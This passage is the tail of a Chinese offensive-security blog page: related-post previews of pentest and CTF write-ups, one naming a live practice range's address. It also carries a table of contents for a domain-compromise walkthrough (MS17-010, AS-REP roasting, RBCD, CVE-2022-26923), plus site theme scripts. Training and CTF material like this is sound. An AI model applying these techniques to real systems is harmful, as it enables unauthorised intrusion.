latency).Not shown: 51285 closed ports, 14244 filtered portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh ...</div></div></div></a><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a><a class="pagination-related" href="/post/the-shooting-range-that-i-accidentally-discovered-during-a-mysterious-group-chat-bwhwi.html" title="水群看见的靶场，打一打"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">水群看见的靶场，打一打</div></div><div class="info-2"><div class="info-item-1">水群看见的靶场，打一打 地址：http://111.119.241.115:10088/ 开放一个靶机，靶机每30分钟重置一次  你需要完成信息收集，拿到初次的一些信息来完成后续的漏洞攻击 你需要找到第二个漏洞来获取第三个高危漏洞 恭喜你获取到了第三个漏洞点，不过值得烧脑的是这个获取shell不是很容易 历经千辛万苦，你获取到了shell，但是需要查看根目录下的flag还是有难度的，你需要根据常用的提权方式和主机的信息泄露获取到后面的一些权限 恭喜你获取到了权限，但还不是root，仔细看看怎么样获取到flag文件？  环境为仿真自建，不针对其他cms，漏洞思路来源于当前现实生活，思路比较新，有一些ctf烧脑，难度适中#渗透测试 #CTF #提权  ‍ 直接给的ip+端口号，可以忽略扫端口那一整块。直接扫目录 ​​ ​​ 扫到了一个database.sql​文件，down下来，审计发现： 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS `admins`;/*!40101 SET...</div></div></div></a><a class="pagination-related" href="/post/ccb-z184yjw.html" title="ccb&amp;ciscn线下半决赛 - wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ccb&amp;ciscn线下半决赛 - wp</div></div><div class="info-2"><div class="info-item-1">ccb&amp;ciscn线下半决赛 - wp 有幸拿到一等奖  awdpphp-master 导入 12345# docker 导入docker load -i xxx.tar# 不知道端口的情况下运行该镜像docker run -it &lt;images&gt; /bin/bash  查看运行端口，发现就是80，那就可以用以下命令运行docker 123docker run -d -p 4545:80 &lt;images&gt; # 进入容器docker exec -it &lt;container&gt; /bin/bash  ‍ 在容器中找到index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php@error_reporting(E_ALL);if...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">symv1a</div><div class="author-info-description">随便写写，随缘更新</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/symya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/symya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:symv1a@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">2022网鼎杯决赛内网靶场复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.1.</span> <span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.2.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan"><span class="toc-number">3.2.1.</span> <span class="toc-text">fscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">3.2.2.</span> <span class="toc-text">隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010"><span class="toc-number">3.2.3.</span> <span class="toc-text">MS17-010</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.2.4.</span> <span class="toc-text">rdp连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8E%A5%E7%AE%A1OA"><span class="toc-number">3.2.5.</span> <span class="toc-text">弱口令接管OA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XR-0687-AS-ERP-Roasting"><span class="toc-number">3.2.6.</span> <span class="toc-text">XR-0687  AS-ERP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACL-Abuse-RBCD%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.7.</span> <span class="toc-text">ACL Abuse+RBCD提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Directory-%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2022-26923"><span class="toc-number">3.2.8.</span> <span class="toc-text">Active Directory 域权限提升漏洞(CVE-2022-26923)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve202551482-letta-ai-component-code-injection-leads-to-rce-zxwmhs.html" title="CVE-2025-51482 Letta AI 组件代码注入导致RCE">CVE-2025-51482 Letta AI 组件代码注入导致RCE</a><time datetime="2026-01-07T10:40:09.000Z" title="Created 2026-01-07 10:40:09">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve20253248-z2i1g0l.html" title="CVE-2025-3248">CVE-2025-3248</a><time datetime="2026-01-05T09:56:35.000Z" title="Created 2026-01-05 09:56:35">2026-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/basic-use-of-suricata-23gslt.html" title="suricata基本使用">suricata基本使用</a><time datetime="2025-12-26T16:37:21.000Z" title="Created 2025-12-26 16:37:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程">MAC+IDA Pro9.2+MCP+Trae配置教程</a><time datetime="2025-12-24T09:44:55.000Z" title="Created 2025-12-24 09:44:55">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp">2025RCTF wp</a><time datetime="2025-11-20T15:51:03.000Z" title="Created 2025-11-20 15:51:03">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By symv1a</span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://symya.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: '',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
